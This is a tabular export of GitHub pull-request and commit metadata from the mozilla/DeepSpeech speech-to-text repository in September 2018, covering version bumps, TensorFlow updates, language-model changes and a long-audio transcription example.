2929,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8cd360835117bd938eabf5518f440b4e4003c47,Bump to version 0.2.0-alpha.10
2930,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00e0b2759d0abf33d5eeaed16b7f499ee0503d80,"Merge pull request #1554 from lissyx/bump-v0.2.0-alpha.10

Bump to version 0.2.0-alpha.10"
2931,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60a196aa886d205922b65e1f1f6093a5776d5246,"Merge pull request #1552 from mozilla/issue1551

Fixed #1551, updated Readme's to 0.2.0"
2932,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42c99ee82e5cd206341fa8c179e4dcbeb58045c5,Bump to v0.2.0 and update prod model
2933,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65c521838be6394367b3fc089cc1c85e5f5d6cb8,"Merge pull request #1558 from mozilla/switch-v0.2.0

Bump to v0.2.0 and update prod model

X-DeepSpeech: NOBUILD"
2934,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,009f9b6c1967a5924e78879b5e4dfc963610b4ba,Retrigger v0.2.0
2935,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1562,1562,Update tf master,,lissyx,1645737,2018-09-19T09:54:35Z,COLLABORATOR,True,118952,120002,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c618974ab89e7882cd3ec7a7d84aa8f1fee9048,Merge remote-tracking branch 'upstream/master' into update-tf_master
2936,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1561,1561,Remove ARM64 dep on 0.1.1,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-19T06:29:26Z,COLLABORATOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05a113e4886b3191af062ed82460ed3b658d3419,"Remove ARM64 dep on 0.1.1

X-DeepSpeech: NOBUILD"
2937,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1558,1558,Bump to v0.2.0 and update prod model,,reuben,477142,2018-09-18T15:12:03Z,MEMBER,True,9,9,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42c99ee82e5cd206341fa8c179e4dcbeb58045c5,Bump to v0.2.0 and update prod model
2938,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1557,1557,Improve tag handling,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-18T13:31:19Z,COLLABORATOR,True,40,35,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9bafe3467e29663e677ad813b86a12ad6dc0a0f,"Improve tag handling

X-DeepSpeech: NOBUILD"
2939,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1556,1556,Add tag event,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-09-18T12:12:51Z,COLLABORATOR,True,2,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e49e0d81da18915e0c7bf0d54e810584d6bceeeb,"Add tag event

X-DeepSpeech: NOBUILD"
2940,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1555,1555,Add CPP artifact deps,,lissyx,1645737,2018-09-18T09:50:01Z,COLLABORATOR,True,10,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adde9daf011be8b5025366aa19c8e58eb842f99f,Add CPP artifact deps
2941,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1554,1554,Bump to version 0.2.0-alpha.10,,lissyx,1645737,2018-09-18T09:20:25Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8cd360835117bd938eabf5518f440b4e4003c47,Bump to version 0.2.0-alpha.10
2942,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1553,1553,Add CPP artifact deps,Required for #1483 ,lissyx,1645737,2018-09-18T09:14:11Z,COLLABORATOR,True,10,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,732b8920fe70a1fd3834235501359395cd459925,Add CPP artifact deps
2943,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1552,1552,"Fixed #1551, updated Readme's to 0.2.0",,kdavis-mozilla,12054740,2018-09-18T08:11:33Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,acc5e733c5c68e389a5f42fb5a22b2554b0a891d,"Fixed #1551, updated Readme's to 0.2.0"
2944,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1550,1550,"Fixed #1549, updated client hyperparams",,kdavis-mozilla,12054740,2018-09-18T07:57:44Z,CONTRIBUTOR,True,6,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47d3dec4fefca0728dd67224084aa8528d76477e,"Fixed #1549, updated client hyperparams"
2945,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1548,1548,Update hyperparams from trained model,,reuben,477142,2018-09-18T02:59:01Z,MEMBER,True,3,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3663bca7e02e36b158930e2095c6414dec3dabdd,Update hyperparams from trained model
2946,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b455b2423622c707c19d97ab34f4d0667ef2bf4c,Remove useless training dep
2947,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea21010b1b8e9c37459df130ff09fef36d2df528,"Merge pull request #1462 from lissyx/remove-prod-dep

Remove useless training dep"
2948,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,650f7f851d36868651101ac963eae7983bc45666,"Revert ""Fixes #1236 (Switch KenLM to trie based language model)""

This reverts commit e34c52fcb98854c5ecc5639a8ace6196f5825fbd."
2949,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f2a5209419d3f6f3d2373d8416a8cd9e42b8b52,"Revert ""Added quntized array language model and trie""

This reverts commit 754ecd831bdbdf106d1cec759bb6e153cfd93739."
2950,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da760bded8f4524ca774e1599a46c54da663b867,"Merge pull request #1465 from lissyx/revert-old-lm

Revert ""Fixes #1236 (Switch KenLM to trie based language model)"""
2951,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d03d48ec1676654d7972b2b8a8488498e3cb0ef1,Bump to version 0.2.0-alpha.8
2952,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd475604cacf19440af4907dfff000ac1d77dc48,"Merge pull request #1470 from lissyx/alpha-8

Bump to version 0.2.0-alpha.8"
2953,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,298d11cd76f2d7e54885758780d87af39bcbbf13,Add test coverage for training from frozen model
2954,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a613c53921b6ad1ff2135ee4e9666bcdd8fc75f,"Fix training from frozen graph

Fixes #1472"
2955,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c09e1b4558ee90a46ed09ea881d3e9ef466c5518,"Merge pull request #1473 from lissyx/feed_dict

Add test coverage for training from frozen model"
2956,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e809e4746a192ea567fa1ac9d0053f3a497908c6,"Remove deprecated tests

We are now only relying on upstream TensorFlow packages and aiming at
being compatible. Makes no sense to continue supporting those,
especially since they are disabled."
2957,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24ac47019f031e490fd338d944cb9a05e4fe70cc,"Merge pull request #1476 from lissyx/cleanup_training

Remove deprecated tests"
2958,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d3818b492045ccea0cea660c27355994c1413b6,"Remove deprecated automation code

Fixes #1478"
2959,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e00bfd0f413912855eb2312bc1efe3bd2b023b25,"Merge pull request #1479 from lissyx/remove-wer-automation

Remove deprecated automation code"
2960,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,400c9c0e5dbcf499f3cc2bf6af1dc3cf84ce8142,Streaming inference
2961,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2be00fad008df371b77055ea8ff9d95ed4877af,Add tool to find out which ops are needed by a graph
2962,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e438ed6f8c9360a08df7fc46a77df83a7ac57fcc,Update native_client/BUILD comment about binary sizes
2963,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e383ac59f23956f91a42825dab4125b052259c8,Add tool to convert graph protobuf to pbtxt
2964,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,831ebf40813deab68c9875b0cef073bc63cc9989,Add evaluate.py script to create a WER report from a checkpoint using the inference graph
2965,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49490f5e68c0cbb2add00762d3a64df870b72103,Increase CI training epochs to guarantee overfitting
2966,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae9c62cae9e4d05df572a57278b711c71b49483c,Convert native API to C instead of C++
2967,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc84bb658abcf91870c049bbbaa3437a23c6404a,Remove some deepspeech_utils references that crept up during rebase
2968,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b8871cd946bf020f756035ba9a42f8f529c5188,Infer n_steps and n_context from model file
2969,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b95ed698168dc06bf645a4b03ef17f0429b6b95,Switch to LSTMBlockFusedCell
2970,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48778fcd0e4721e861135f798b4ac7340c3b399b,Don't handle dropout rates as Python values
2971,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f810ee0017be73c85d0c9554c395e0217cbfad7,Add intermediateDecode method to the API
2972,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cbb33c85637876145d6c0e279743c5397f4fbd24,Finalize training graph before starting training
2973,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac41fe0006a723cd1f76c3124f0fea21b40e21a8,Disable AOT tasks
2974,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,385bc7a65fecea519bc5733b1c42015422dd7ed3,Remove word count bonus in favor of length normalization
2975,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1546,1546,Update tf master,,lissyx,1645737,2018-09-17T11:11:35Z,COLLABORATOR,True,121648,403012,136,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8fecc33333c4855087c02d15a6a91b89c3494598,Architecture changes from training
2976,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1543,1543,Update language model to a trie-based LM created from the LibriSpeech LM corpus,This supersedes the quick fix that is currently in the tree.,reuben,477142,2018-09-16T23:37:59Z,MEMBER,True,118719,119795,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cb86e7e1915194fed54b6bd256781e770747685c,Update language model to a trie-based LM created from the LibriSpeech LM corpus
2977,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1542,1542,Ensure xxd is installed,Fixes #1541,lissyx,1645737,2018-09-14T17:27:27Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c591cdd51f9cc4f0de7c00656fd2797e4df64234,"Ensure xxd is installed

Fixes #1541"
2978,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1539,1539,Removing old training scripts and website support - #1534 #1538,,tilmankamp,5991088,2018-09-13T13:03:55Z,CONTRIBUTOR,True,0,740,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db702817b0c314e9dbdc420de2cd903aeaeb10aa,Removing old training scripts and website support - #1534 #1538
2979,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1532,1532,Feature caching,This doubles as road-paving for an easier tf.data.Dataset implementation of the feeding code.,reuben,477142,2018-09-11T22:50:28Z,MEMBER,True,202,185,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,44e502e236d676dfcdb3068f6a6d9d1a9d644dd1,Feature caching
2980,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1532,1532,Feature caching,This doubles as road-paving for an easier tf.data.Dataset implementation of the feeding code.,reuben,477142,2018-09-11T22:50:28Z,MEMBER,True,202,185,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25a9e76afcf8aafe17bb77ab90ea25ffdfb7ec84,Support relative paths in CSVs
2981,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1532,1532,Feature caching,This doubles as road-paving for an easier tf.data.Dataset implementation of the feeding code.,reuben,477142,2018-09-11T22:50:28Z,MEMBER,True,202,185,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,778f5deb9d218bfc7cbb204c3030a506036a4bf3,Fix export graph
2982,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1532,1532,Feature caching,This doubles as road-paving for an easier tf.data.Dataset implementation of the feeding code.,reuben,477142,2018-09-11T22:50:28Z,MEMBER,True,202,185,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,799baf1f990af2e6b600575a07780f192b6dbae4,Fix parameter inference from model shape
2983,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1532,1532,Feature caching,This doubles as road-paving for an easier tf.data.Dataset implementation of the feeding code.,reuben,477142,2018-09-11T22:50:28Z,MEMBER,True,202,185,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f9d960fd284902b2819569e38bca10c41fd5064,Strip output before testing correctness in inference tests
2984,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1527,1527,Transcribing longer audio clips,"Prerequisites
-------------
pip3 install --user webrtcvad; pip3 install --user deepspeech;
pip3 install --user tensorflow; pip3 install -r requirements.txt
sudo apt install python3-pyqt5

Command line tool
-----------------
The command line tool processes all the wave files present in the
directory mentioned during executing.

~/DeepSpeech$ python3 Audio_Transcript.py 1 ../../audio/original

Minimalistic GUI
----------------
The GUI can transcribe one audio clip at a time.

~/DeepSpeech$ python3 Audio_Transcript_GUI.py",b-ak,4998776,2018-09-08T18:54:33Z,CONTRIBUTOR,True,625,0,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89620bc448c3548c8e12591cc24f7a543a8c7a0b,"Transcribing longer audio clips

Prerequisites
-------------
~/Deepspeech$ sudo apt install virtualenv
~/Deepspeech$ cd examples/vad_transcriber
~/Deepspeech/examples/vad_transcriber$ virtualenv -p python3 venv
~/Deepspeech/examples/vad_transcriber$ source venv/bin/activate
(venv) ~/Deepspeech/examples/vad_transcriber$ pip3 install -r requirements.txt

Command line tool
-----------------
The command line tool processes a wav file of any duration and returns a trancript
which will the saved in the same directory as the input audio file.

(venv) ~/Deepspeech/examples/vad_transcriber
$ python3 audioTranscript_cmd.py --aggressive 1 --audio ./audio/guido-van-rossum.wav --model ./models/0.2.0/

Minimalistic GUI
----------------
The GUI tool does the same job as the CLI tool. The VAD is fixed at an aggressiveness of 1.
The output is displayed in the transcription window and saved into the directory as the input
audio file as well.

(venv) ~/Deepspeech/examples/vad_transcriber
$ python3 audioTranscript_gui.py

Changes(v1):
1. Using Deepspeech python module instead of subprocess
2. Moved VAD code to a module
3. Moved all files to bin/ and renamed README.md to Audio_Transcription.md

Changes(v2):
Renamed files

Changes (v2.1):
1. Refactoring between CMD and GUI code
2. Documenting pre-requisites with a virtualenv
3. Loading model only once per long wav file
4. CMD and GUI tool do the same job, perform VAD and consolidate the output.
5. Chunks are not saved in the disk. Using a numpy interger array to store them.

Changes (v2.2):
1. Argparse module for command line arguments
2. Everything in virtualenv, with a requirements.txt
3. Older APIs aligned with 0.2.0 release
4. Moved all files into examples/vad_transcriber

Changes (v2.3)
1. Updated requirements.txt"
2985,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1523,1523,Explicit mention of supported platforms; should infer no default Wind…,"Explicit mention of supported platforms; should infer no default Windows support

Currently there's no conspicuous list of supported platforms. This should make it clear from the pre-requisites which platforms are supported.

I wasted a fair bit of time when not realizing Windows was not supported. Having this would have helped.",the-nose-knows,25645310,2018-09-07T01:05:10Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96872fdfe4cc9d4658279315ebfc900d283d7e90,Explicit mention of supported platforms; should infer no default Windows support
2986,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1522,1522,Updated cuDNN version from 7.1.1 to 7.2.1.,"Noticed the following error when building a docker image from the Dockerfile.

`
Cuda Configuration Error: cuDNN version detected from /usr/lib/x86_64-linux-gnu/include/cudnn.h (7.2.1) does not match TF_CUDNN_VERSION (7.1.1)
`

It appears that there was a recent [update to the nvidia/cuda:9.0-cudnn7-devel-ubuntu16.04 Dockerfile](https://gitlab.com/nvidia/cuda/commit/53f94eeead7089b35c00a1f3fc78855eae45c678).

This commit aims to resolve the issue by updating TF_CUDNN_VERSION to 7.2.1.",aaron-owen,34038355,2018-09-06T21:54:00Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a7ac2239eeddcde198f741aa2e5e2a08ef890fa,"Updated cuDNN version from 7.1.1 to 7.2.1.

Cuda Configuration Error: cuDNN version detected from /usr/lib/x86_64-linux-gnu/include/cudnn.h (7.2.1) does not match TF_CUDNN_VERSION (7.1.1)"
2987,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1517,1517,Default training setup for new cluster,"- Based on 0.1.1 hyperparameters
- Successfully started a test training 
- This will/should not get merged before test training concludes

X-DeepSpeech: NOBUILD",tilmankamp,5991088,2018-09-05T09:08:04Z,CONTRIBUTOR,True,35,87,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c669723c7e4993f03aaa0267e7f1c8abd675428,Default training setup for new cluster
2988,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1510,1510,Changed command line arguments to reflect how the binary actually works,,boxabirds,147305,2018-08-26T17:43:30Z,NONE,False,8,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bc0ed8cf359100c26758f8da075b39b1b6033e2,Changed command line arguments to reflect how the binary actually works currently
2989,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1502,1502,Pass reuse flag to LSTMBlockFusedCell (Fixes #1500),,reuben,477142,2018-08-15T19:00:23Z,MEMBER,True,5,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25de412c9dcddd7c7a221680664ac272a34c87db,Pass reuse flag to LSTMBlockFusedCell
2990,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1501,1501,"Changes including Horovod integration, removed coordinator code and u…","…sed dataset APIs in place of feed dictionaries.

This pull request is based on the Mozilla Project DeepSpeech code, but has been integrated with Horovod and currently only supports training.
In order to aid scaling to a large number of CPU nodes, we've removed the coordinator code. We've also used dataset APIs in place of feed dictionaries.
This script has been extensively tested on CPUs. This script has not been tested on GPUs.
We've also implemented a dataset partitioning scheme based on the rank of the worker to minimize imbalance between workers processing audio of different source lengths during distributed training.
We've also added code for learning rate gradual warmup for large batch size training.
This pull request is targeted at developers interested in scaling DeepSpeech training to a large number of nodes using Horovod on CPUs. Please let us know what the best place to host these changes would be(including possibly in a separate branch). Thanks!",karkadad,26637358,2018-08-15T16:48:35Z,NONE,False,414,1277,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc8c12b9caedaf090521288e43b7030adb9f4169,"Changes including Horovod integration, removed coordinator code and used dataset APIs in place of feed dictionaries."
